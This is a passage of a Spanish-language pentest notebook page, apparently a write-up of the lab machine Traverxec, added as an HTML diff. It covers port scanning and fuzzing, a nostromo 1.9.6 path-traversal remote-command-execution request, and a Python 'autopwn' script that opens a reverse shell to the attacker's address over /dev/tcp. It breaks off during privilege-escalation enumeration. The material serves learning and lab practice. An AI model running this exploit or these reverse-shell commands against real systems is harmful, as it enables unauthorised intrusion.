@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="" xml:lang="">
+<head>
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>Traverxec | 2021 - S4viNotes</title>
+  <meta name="description" content="Full Pentest notebook" />
+  <meta name="generator" content="bookdown 0.21 and GitBook 2.6.7" />
+
+  <meta property="og:title" content="Traverxec | 2021 - S4viNotes" />
+  <meta property="og:type" content="book" />
+  
+  
+  <meta property="og:description" content="Full Pentest notebook" />
+  <meta name="github-repo" content="https://github.com/mlopez66/hacking-notes" />
+
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Traverxec | 2021 - S4viNotes" />
+  
+  <meta name="twitter:description" content="Full Pentest notebook" />
+  
+
+<meta name="author" content="Lo0pInG 404" />
+
+
+
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+  
+  
+<link rel="prev" href="olympus.html"/>
+<link rel="next" href="armageddon.html"/>
+<script src="libs/jquery-2.2.3/jquery.min.js"></script>
+<link href="libs/gitbook-2.6.7/css/style.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-table.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-bookdown.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-highlight.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-search.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-fontsettings.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-clipboard.css" rel="stylesheet" />
+
+
+
+
+
+
+
+
+
+<script src="libs/accessible-code-block-0.0.1/empty-anchor.js"></script>
+
+
+<style type="text/css">
+code.sourceCode > span { display: inline-block; line-height: 1.25; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode { white-space: pre; position: relative; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+code.sourceCode { white-space: pre-wrap; }
+code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    color: #aaaaaa;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+code span.at { color: #7d9029; } /* Attribute */
+code span.bn { color: #40a070; } /* BaseN */
+code span.bu { } /* BuiltIn */
+code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #4070a0; } /* Char */
+code span.cn { color: #880000; } /* Constant */
+code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+code span.dt { color: #902000; } /* DataType */
+code span.dv { color: #40a070; } /* DecVal */
+code span.er { color: #ff0000; font-weight: bold; } /* Error */
+code span.ex { } /* Extension */
+code span.fl { color: #40a070; } /* Float */
+code span.fu { color: #06287e; } /* Function */
+code span.im { } /* Import */
+code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+code span.op { color: #666666; } /* Operator */
+code span.ot { color: #007020; } /* Other */
+code span.pp { color: #bc7a00; } /* Preprocessor */
+code span.sc { color: #4070a0; } /* SpecialChar */
+code span.ss { color: #bb6688; } /* SpecialString */
+code span.st { color: #4070a0; } /* String */
+code span.va { color: #19177c; } /* Variable */
+code span.vs { color: #4070a0; } /* VerbatimString */
+code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+</style>
+
+<link rel="stylesheet" href="assets/gitbook.css" type="text/css" />
+</head>
+
+<body>
+
+
+
+  <div class="book without-animation with-summary font-size-2 font-family-1" data-basepath=".">
+
+    <div class="book-summary">
+      <nav role="navigation">
+
+<ul class="summary">
+<li class="header-light">
+  <a class="logo" href="/">
+    <img src="assets/wr404-transparent.png" alt="LoOpInG 404" class="img-fluid">
+  </a>
+  <h1>Lo0pInG 404</h1>
+</li>
+
+<li class="divider"></li>
+<li class="chapter" data-level="" data-path="index.html"><a href="index.html"><i class="fa fa-check"></i>Preface</a><ul>
+<li class="chapter" data-level="" data-path="index.html"><a href="index.html#introduction-1"><i class="fa fa-check"></i>Introduction</a></li>
+<li class="chapter" data-level="" data-path="index.html"><a href="index.html#acknoledgement-1"><i class="fa fa-check"></i>Acknoledgement</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html"><i class="fa fa-check"></i>Olympus</a><ul>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#introduccion"><i class="fa fa-check"></i>Introduccion</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#enumeracion"><i class="fa fa-check"></i>Enumeracion</a><ul>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#reconocimiento-de-maquina-puertos-abiertos-y-servicios"><i class="fa fa-check"></i>Reconocimiento de maquina, puertos abiertos y servicios</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#empezamos-por-el-puerto-80"><i class="fa fa-check"></i>Empezamos por el puerto 80</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#vulnerability-assessment"><i class="fa fa-check"></i>Vulnerability Assessment</a><ul>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#searchsploit"><i class="fa fa-check"></i>searchsploit</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#pruebas-del-exploit"><i class="fa fa-check"></i>Pruebas del exploit</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#exploitacion-de-la-vulnerabilida"><i class="fa fa-check"></i>Exploitacion de la vulnerabilida</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#vuln-exploit-gaining-access"><i class="fa fa-check"></i>Vuln exploit &amp; Gaining Access</a><ul>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#ganando-accesso-con-la-vuln-xdebug"><i class="fa fa-check"></i>Ganando accesso con la vuln XDebug</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#tratamiento-de-la-tty"><i class="fa fa-check"></i>Tratamiento de la TTY</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#investigamos-la-maquina"><i class="fa fa-check"></i>Investigamos la maquina</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#airgeddon.cap-crack-with-aircrack-ng"><i class="fa fa-check"></i>Airgeddon.cap crack with Aircrack-ng</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#conneccion-a-la-maquina-victima"><i class="fa fa-check"></i>Conneccion a la maquina victima</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#investigacion-de-la-maquina-victima"><i class="fa fa-check"></i>Investigacion de la maquina victima</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#port-knocking"><i class="fa fa-check"></i>Port Knocking</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#privilege-escalation"><i class="fa fa-check"></i>Privilege Escalation</a><ul>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#enumeracion-del-usuario-en-la-maquina-victima"><i class="fa fa-check"></i>Enumeracion del usuario en la maquina victima</a></li>
+<li class="chapter" data-level="" data-path="olympus.html"><a href="olympus.html#escalacion-de-privilegios-con-docker"><i class="fa fa-check"></i>Escalacion de privilegios con Docker</a></li>
+</ul></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html"><i class="fa fa-check"></i>Traverxec</a><ul>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#introduccion-1"><i class="fa fa-check"></i>Introduccion</a></li>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#enumeracion-1"><i class="fa fa-check"></i>Enumeracion</a><ul>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#reconocimiento-de-maquina-puertos-abiertos-y-servicios-1"><i class="fa fa-check"></i>Reconocimiento de maquina, puertos abiertos y servicios</a></li>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#empezamos-por-el-puerto-80-1"><i class="fa fa-check"></i>Empezamos por el puerto 80</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#vulnerability-assessment-1"><i class="fa fa-check"></i>Vulnerability Assessment</a><ul>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#searchsploit-1"><i class="fa fa-check"></i>searchsploit</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#vuln-exploit-gaining-access-1"><i class="fa fa-check"></i>Vuln exploit &amp; Gaining Access</a><ul>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#autopwn.py"><i class="fa fa-check"></i>Autopwn.py</a></li>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#tratamiento-de-la-tty-1"><i class="fa fa-check"></i>Tratamiento de la TTY</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#privilege-escalation-1"><i class="fa fa-check"></i>Privilege Escalation</a><ul>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#enumeracion-del-usuario-en-la-maquina-victima-1"><i class="fa fa-check"></i>Enumeracion del usuario en la maquina victima</a></li>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#john"><i class="fa fa-check"></i>John</a></li>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#investigacion-del-public_www"><i class="fa fa-check"></i>Investigacion del public_www</a></li>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#ssh2john"><i class="fa fa-check"></i>ssh2john</a></li>
+<li class="chapter" data-level="" data-path="traverxec.html"><a href="traverxec.html#escalada-de-privilegio-para-root"><i class="fa fa-check"></i>Escalada de privilegio para root</a></li>
+</ul></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="armageddon.html"><a href="armageddon.html"><i class="fa fa-check"></i>Armageddon</a><ul>
+<li class="chapter" data-level="" data-path="armageddon.html"><a href="armageddon.html#introduccion-2"><i class="fa fa-check"></i>Introduccion</a></li>
+<li class="chapter" data-level="" data-path="armageddon.html"><a href="armageddon.html#enumeracion-2"><i class="fa fa-check"></i>Enumeracion</a><ul>
+<li class="chapter" data-level="" data-path="armageddon.html"><a href="armageddon.html#reconocimiento-de-maquina-puertos-abiertos-y-servicios-2"><i class="fa fa-check"></i>Reconocimiento de maquina, puertos abiertos y servicios</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="armageddon.html"><a href="armageddon.html#vulnerability-assessment-2"><i class="fa fa-check"></i>Vulnerability Assessment</a><ul>
+<li class="chapter" data-level="" data-path="armageddon.html"><a href="armageddon.html#druppalgeddon"><i class="fa fa-check"></i>Druppalgeddon</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="armageddon.html"><a href="armageddon.html#vuln-exploit-gaining-access-2"><i class="fa fa-check"></i>Vuln exploit &amp; Gaining Access</a><ul>
+<li class="chapter" data-level="" data-path="armageddon.html"><a href="armageddon.html#tratamiento-de-la-tty-2"><i class="fa fa-check"></i>Tratamiento de la TTY</a></li>
+<li class="chapter" data-level="" data-path="armageddon.html"><a href="armageddon.html#investigamos-la-maquina-1"><i class="fa fa-check"></i>Investigamos la maquina</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="armageddon.html"><a href="armageddon.html#privilege-escalation-2"><i class="fa fa-check"></i>Privilege Escalation</a><ul>
+<li class="chapter" data-level="" data-path="armageddon.html"><a href="armageddon.html#enumeracion-del-usuario-en-la-maquina-victima-2"><i class="fa fa-check"></i>Enumeracion del usuario en la maquina victima</a></li>
+</ul></li>
+</ul></li>
+<li class="divider"></li>
+<li class="summary-footer"><a class="logo" href="https://lopezmichel.org"><img alt="IPESE" src="assets/wr404-transparent.png"></a></li>
+
+</ul>
+
+      </nav>
+    </div>
+
+    <div class="book-body">
+      <div class="body-inner">
+        <div class="book-header" role="navigation">
+          <h1>
+            <i class="fa fa-circle-o-notch fa-spin"></i><a href="./">2021 - S4viNotes</a>
+          </h1>
+        </div>
+
+        <div class="page-wrapper" tabindex="-1" role="main">
+          <div class="page-inner">
+
+            <section class="normal" id="section-">
+<div id="traverxec" class="section level1 unnumbered">
+<h1>Traverxec</h1>
+<div id="introduccion-1" class="section level2 unnumbered">
+<h2>Introduccion</h2>
+<p>La maquina del dia 23/07/2021 se llama Traverxec.</p>
+<p>El replay del live se puede ver en <a href="https://www.twitch.tv/videos/1095841567">Twitch: S4vitaar Traverxec maquina</a></p>
+
+</div>
+<div id="enumeracion-1" class="section level2 unnumbered">
+<h2>Enumeracion</h2>
+<div id="reconocimiento-de-maquina-puertos-abiertos-y-servicios-1" class="section level3 unnumbered">
+<h3>Reconocimiento de maquina, puertos abiertos y servicios</h3>
+<div id="ping-1" class="section level4 unnumbered">
+<h4>Ping</h4>
+<div class="sourceCode" id="cb42"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb42-1"><a href="traverxec.html#cb42-1"></a><span class="fu">ping</span> -c 1 10.10.10.165</span></code></pre></div>
+<p>ttl: 63 -&gt; maquina linux</p>
+</div>
+<div id="nmap-1" class="section level4 unnumbered">
+<h4>Nmap</h4>
+<div class="sourceCode" id="cb43"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb43-1"><a href="traverxec.html#cb43-1"></a><span class="fu">nmap</span> -p- --open -T5 -v -n 10.10.10.165</span></code></pre></div>
+<p>Va un poquito lento…</p>
+<div class="sourceCode" id="cb44"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb44-1"><a href="traverxec.html#cb44-1"></a><span class="fu">nmap</span> -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.165 -oG allPorts</span>
+<span id="cb44-2"><a href="traverxec.html#cb44-2"></a><span class="ex">extractPorts</span> allPorts</span>
+<span id="cb44-3"><a href="traverxec.html#cb44-3"></a><span class="fu">nmap</span> -sC -sV -p 10.10.10.165 -oN targeted</span></code></pre></div>
+<table>
+<thead>
+<tr class="header">
+<th>Puerto</th>
+<th>Servicio</th>
+<th>Que se nos occure?</th>
+<th>Que falta?</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>22</td>
+<td>ssh</td>
+<td>conneccion a la maquina</td>
+<td>Usuario contraseña</td>
+</tr>
+<tr class="even">
+<td>80</td>
+<td>http</td>
+<td>whatweb, http-enum</td>
+<td>Checkear la web</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<div id="empezamos-por-el-puerto-80-1" class="section level3 unnumbered">
+<h3>Empezamos por el puerto 80</h3>
+<div id="whatweb-1" class="section level4 unnumbered">
+<h4>Whatweb</h4>
+<div class="sourceCode" id="cb45"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb45-1"><a href="traverxec.html#cb45-1"></a><span class="ex">whatweb</span> http://10.10.10.165</span></code></pre></div>
+<ul>
+<li>nostromo 1.9.6</li>
+</ul>
+</div>
+<div id="checkear-la-cabezera" class="section level4 unnumbered">
+<h4>Checkear la cabezera</h4>
+<div class="sourceCode" id="cb46"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb46-1"><a href="traverxec.html#cb46-1"></a><span class="ex">curl</span> -s -X GET -I http://10.10.10.165</span></code></pre></div>
+<ul>
+<li>nostromo 1.9.6</li>
+</ul>
+</div>
+<div id="browsear-la-web-1" class="section level4 unnumbered">
+<h4>Browsear la web</h4>
+<p>Nada interessante.</p>
+</div>
+<div id="wfuzz-1" class="section level4 unnumbered">
+<h4>WFuzz</h4>
+<p>Como no hay mucho mas que ver, applicaremos <strong>fuzzing</strong> para descubrir si hay mas rutas.</p>
+<div class="sourceCode" id="cb47"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb47-1"><a href="traverxec.html#cb47-1"></a><span class="ex">wfuzz</span> -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.233/FUZZ</span></code></pre></div>
+<p>No hay nada, creamos un fichero de extensiones txt, php, html y fuzzeamos otravez.</p>
+<div class="sourceCode" id="cb48"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb48-1"><a href="traverxec.html#cb48-1"></a><span class="ex">wfuzz</span> -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions http://10.10.10.233/FUZZ.FUZ2Z</span></code></pre></div>
+<p>No hay nada.</p>
+
+</div>
+</div>
+</div>
+<div id="vulnerability-assessment-1" class="section level2 unnumbered">
+<h2>Vulnerability Assessment</h2>
+<div id="searchsploit-1" class="section level3 unnumbered">
+<h3>searchsploit</h3>
+<p>Checkeamos si existe un exploit relacionado con <strong>nostromo 1.9.6</strong></p>
+<div class="sourceCode" id="cb49"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb49-1"><a href="traverxec.html#cb49-1"></a><span class="ex">searchsploit</span> nostromo </span></code></pre></div>
+<p>Hay un script en Python que permitiria hacer execucion de commandos. Nos traemos el script en el repertorio de trabajo.</p>
+<div class="sourceCode" id="cb50"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb50-1"><a href="traverxec.html#cb50-1"></a><span class="ex">searchsploit</span> -m 47837</span>
+<span id="cb50-2"><a href="traverxec.html#cb50-2"></a><span class="fu">mv</span> 47837.py nostromo_exploit.py</span></code></pre></div>
+<p>Analizando el script con <code>cat</code>, vemos como se uza el exploit. Intentamos reproduzir los passos antes de crearnos nuestro
+proprio script.</p>
+<ol style="list-style-type: decimal">
+<li><p>En una terminal</p>
+<div class="sourceCode" id="cb51"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb51-1"><a href="traverxec.html#cb51-1"></a><span class="ex">nc</span> -nlvp 443</span></code></pre></div></li>
+<li><p>En otra terminal</p>
+<div class="sourceCode" id="cb52"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb52-1"><a href="traverxec.html#cb52-1"></a><span class="ex">telnet</span> 10.10.10.165 80</span>
+<span id="cb52-2"><a href="traverxec.html#cb52-2"></a><span class="ex">POST</span> /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span>
+<span id="cb52-3"><a href="traverxec.html#cb52-3"></a><span class="ex">Content-Length</span>: 1</span>
+<span id="cb52-4"><a href="traverxec.html#cb52-4"></a></span>
+<span id="cb52-5"><a href="traverxec.html#cb52-5"></a><span class="fu">whoami</span> <span class="kw">|</span> <span class="ex">nc</span> 10.10.14.20 443</span></code></pre></div></li>
+</ol>
+<p>Se ve <code>www-data</code> en la primera terminal.</p>
+<p>Ya podemos crearnos el script.</p>
+
+</div>
+</div>
+<div id="vuln-exploit-gaining-access-1" class="section level2 unnumbered">
+<h2>Vuln exploit &amp; Gaining Access</h2>
+<div id="autopwn.py" class="section level3 unnumbered">
+<h3>Autopwn.py</h3>
+<div class="sourceCode" id="cb53"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb53-1"><a href="traverxec.html#cb53-1"></a><span class="co">#!/usr/bin/python3</span></span>
+<span id="cb53-2"><a href="traverxec.html#cb53-2"></a></span>
+<span id="cb53-3"><a href="traverxec.html#cb53-3"></a><span class="im">import</span> requests</span>
+<span id="cb53-4"><a href="traverxec.html#cb53-4"></a><span class="im">import</span> sys</span>
+<span id="cb53-5"><a href="traverxec.html#cb53-5"></a><span class="im">import</span> signal</span>
+<span id="cb53-6"><a href="traverxec.html#cb53-6"></a><span class="im">import</span> pdb</span>
+<span id="cb53-7"><a href="traverxec.html#cb53-7"></a><span class="im">import</span> threading</span>
+<span id="cb53-8"><a href="traverxec.html#cb53-8"></a><span class="im">import</span> time</span>
+<span id="cb53-9"><a href="traverxec.html#cb53-9"></a></span>
+<span id="cb53-10"><a href="traverxec.html#cb53-10"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb53-11"><a href="traverxec.html#cb53-11"></a></span>
+<span id="cb53-12"><a href="traverxec.html#cb53-12"></a><span class="kw">def</span> def_handler(sig, frame):</span>
+<span id="cb53-13"><a href="traverxec.html#cb53-13"></a>    <span class="bu">print</span>(<span class="st">&quot;</span><span class="ch">\n</span><span class="st">[!] Saliendo...</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
+<span id="cb53-14"><a href="traverxec.html#cb53-14"></a>    sys.exit(<span class="dv">1</span>)</span>
+<span id="cb53-15"><a href="traverxec.html#cb53-15"></a></span>
+<span id="cb53-16"><a href="traverxec.html#cb53-16"></a><span class="co"># Ctrl+C</span></span>
+<span id="cb53-17"><a href="traverxec.html#cb53-17"></a>signal.signal(signal.SIGINT, def_handler)</span>
+<span id="cb53-18"><a href="traverxec.html#cb53-18"></a></span>
+<span id="cb53-19"><a href="traverxec.html#cb53-19"></a><span class="co"># Variables globales</span></span>
+<span id="cb53-20"><a href="traverxec.html#cb53-20"></a>main_url <span class="op">=</span> <span class="st">&quot;http://10.10.10.165/.</span><span class="sc">%0d</span><span class="st">./.</span><span class="sc">%0d</span><span class="st">./.</span><span class="sc">%0d</span><span class="st">./.</span><span class="sc">%0d</span><span class="st">./bin/sh&quot;</span></span>
+<span id="cb53-21"><a href="traverxec.html#cb53-21"></a>lport <span class="op">=</span> <span class="dv">443</span></span>
+<span id="cb53-22"><a href="traverxec.html#cb53-22"></a></span>
+<span id="cb53-23"><a href="traverxec.html#cb53-23"></a><span class="kw">def</span> makeRequest():</span>
+<span id="cb53-24"><a href="traverxec.html#cb53-24"></a></span>
+<span id="cb53-25"><a href="traverxec.html#cb53-25"></a>    data_post <span class="op">=</span> {</span>
+<span id="cb53-26"><a href="traverxec.html#cb53-26"></a>        b<span class="st">&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.20/443 0&gt;&amp;1&quot;&#39;</span></span>
+<span id="cb53-27"><a href="traverxec.html#cb53-27"></a>    }</span>
+<span id="cb53-28"><a href="traverxec.html#cb53-28"></a></span>
+<span id="cb53-29"><a href="traverxec.html#cb53-29"></a>    r <span class="op">=</span> requests.post(main_url, data<span class="op">=</span>data_post)</span>
+<span id="cb53-30"><a href="traverxec.html#cb53-30"></a></span>
+<span id="cb53-31"><a href="traverxec.html#cb53-31"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</span>
+<span id="cb53-32"><a href="traverxec.html#cb53-32"></a></span>
+<span id="cb53-33"><a href="traverxec.html#cb53-33"></a>    <span class="cf">try</span>:</span>
+<span id="cb53-34"><a href="traverxec.html#cb53-34"></a>        threading.Thread(target<span class="op">=</span>makeRequest, args<span class="op">=</span>()).start()</span>
+<span id="cb53-35"><a href="traverxec.html#cb53-35"></a>    <span class="cf">except</span> <span class="pp">Exception</span> <span class="im">as</span> e:</span>
+<span id="cb53-36"><a href="traverxec.html#cb53-36"></a>        log.error(<span class="bu">str</span>(e))</span>
+<span id="cb53-37"><a href="traverxec.html#cb53-37"></a></span>
+<span id="cb53-38"><a href="traverxec.html#cb53-38"></a>    p1 <span class="op">=</span> log.progress(<span class="st">&quot;Acceso&quot;</span>)</span>
+<span id="cb53-39"><a href="traverxec.html#cb53-39"></a>    p1.status(<span class="st">&quot;Ganando acceso al sistema&quot;</span>)</span>
+<span id="cb53-40"><a href="traverxec.html#cb53-40"></a></span>
+<span id="cb53-41"><a href="traverxec.html#cb53-41"></a>    shell <span class="op">=</span> listen(lport, timeout<span class="op">=</span><span class="dv">5</span>).wait_for_connection()</span>
+<span id="cb53-42"><a href="traverxec.html#cb53-42"></a></span>
+<span id="cb53-43"><a href="traverxec.html#cb53-43"></a>    <span class="cf">if</span> shell.sock <span class="kw">is</span> <span class="va">None</span>:</span>
+<span id="cb53-44"><a href="traverxec.html#cb53-44"></a>        p1.failure(<span class="st">&quot;No ha sido posible ganar acceso al sistema&quot;</span>)</span>
+<span id="cb53-45"><a href="traverxec.html#cb53-45"></a>        sys.exit(<span class="dv">1</span>)</span>
+<span id="cb53-46"><a href="traverxec.html#cb53-46"></a>    <span class="cf">else</span>:</span>
+<span id="cb53-47"><a href="traverxec.html#cb53-47"></a>        shell.interactive()</span></code></pre></div>
+<p>Lo ejecutamos</p>
+<div class="sourceCode" id="cb54"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb54-1"><a href="traverxec.html#cb54-1"></a><span class="ex">python</span> autopwn.py</span>
+<span id="cb54-2"><a href="traverxec.html#cb54-2"></a><span class="fu">whoami</span></span>
+<span id="cb54-3"><a href="traverxec.html#cb54-3"></a><span class="co">#Output</span></span>
+<span id="cb54-4"><a href="traverxec.html#cb54-4"></a><span class="ex">www-data</span></span>
+<span id="cb54-5"><a href="traverxec.html#cb54-5"></a></span>
+<span id="cb54-6"><a href="traverxec.html#cb54-6"></a><span class="ex">ifconfig</span></span></code></pre></div>
+<p>El tito prefiere entablarse una shell normal. Se pone en escucha con <code>nc -nlvp 443</code> y lanza en la shell creado por el script
+<code>bash -i &gt;&amp; /dev/tcp/10.10.14.20/443 0&gt;&amp;1</code></p>
+</div>
+<div id="tratamiento-de-la-tty-1" class="section level3 unnumbered">
+<h3>Tratamiento de la TTY</h3>
+<div class="sourceCode" id="cb55"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb55-1"><a href="traverxec.html#cb55-1"></a><span class="ex">script</span> /dev/null -c bash</span>
+<span id="cb55-2"><a href="traverxec.html#cb55-2"></a>^<span class="ex">Z</span></span>
+<span id="cb55-3"><a href="traverxec.html#cb55-3"></a><span class="fu">stty</span> raw -echo<span class="kw">;</span> <span class="bu">fg</span></span>
+<span id="cb55-4"><a href="traverxec.html#cb55-4"></a><span class="ex">-</span><span class="op">&gt;</span> reset</span>
+<span id="cb55-5"><a href="traverxec.html#cb55-5"></a><span class="ex">-</span><span class="op">&gt;</span> xterm</span>
+<span id="cb55-6"><a href="traverxec.html#cb55-6"></a><span class="bu">export</span> <span class="va">TERM=</span>xterm</span>
+<span id="cb55-7"><a href="traverxec.html#cb55-7"></a><span class="bu">export</span> <span class="va">SHELL=</span>bash</span>
+<span id="cb55-8"><a href="traverxec.html#cb55-8"></a></span>
+<span id="cb55-9"><a href="traverxec.html#cb55-9"></a><span class="fu">stty</span> -a</span>
+<span id="cb55-10"><a href="traverxec.html#cb55-10"></a></span>
+<span id="cb55-11"><a href="traverxec.html#cb55-11"></a><span class="fu">stty</span> rows <span class="op">&lt;</span>rownb<span class="op">&gt;</span> columns <span class="op">&lt;</span>colnb<span class="op">&gt;</span></span></code></pre></div>
+
+</div>
+</div>
+<div id="privilege-escalation-1" class="section level2 unnumbered">
+<h2>Privilege Escalation</h2>
+<div id="enumeracion-del-usuario-en-la-maquina-victima-1" class="section level3 unnumbered">
+<h3>Enumeracion del usuario en la maquina victima</h3>
+<div class="sourceCode" id="cb56"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb56-1"><a href="traverxec.html#cb56-1"></a><span class="bu">cd</span> /home</span>
+<span id="cb56-2"><a href="traverxec.html#cb56-2"></a><span class="co">#Output</span></span>
+<span id="cb56-3"><a href="traverxec.html#cb56-3"></a><span class="ex">david</span></span>
+<span id="cb56-4"><a href="traverxec.html#cb56-4"></a></span>
+<span id="cb56-5"><a href="traverxec.html#cb56-5"></a><span class="fu">ls</span> /home/david</span>
+<span id="cb56-6"><a href="traverxec.html#cb56-6"></a><span class="co">#Output</span></span>
+<span id="cb56-7"><a href="traverxec.html#cb56-7"></a><span class="ex">Permisson</span> denied</span>
+<span id="cb56-8"><a href="traverxec.html#cb56-8"></a></span>
+<span id="cb56-9"><a href="traverxec.html#cb56-9"></a><span class="fu">ls</span> -l /home</span>
+<span id="cb56-10"><a href="traverxec.html#cb56-10"></a><span class="co">#Output</span></span>
+<span id="cb56-11"><a href="traverxec.html#cb56-11"></a><span class="ex">drwx--x--x</span></span></code></pre></div>
+<p>Enumeramos el systema</p>
+<div class="sourceCode" id="cb57"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb57-1"><a href="traverxec.html#cb57-1"></a><span class="bu">cd</span> /</span>
+<span id="cb57-2"><a href="traverxec.html#cb57-2"></a><span class="fu">id</span></span>
+<span id="cb57-3"><a href="traverxec.html#cb57-3"></a><span class="fu">sudo</span> -l</span>
+<span id="cb57-4"><a href="traverxec.html#cb57-4"></a><span class="fu">find</span> \-perm -4000 <span class="op">2&gt;</span>/dev/null</span>
+<span id="cb57-5"><a href="traverxec.html#cb57-5"></a><span class="bu">cd</span> /var</span>
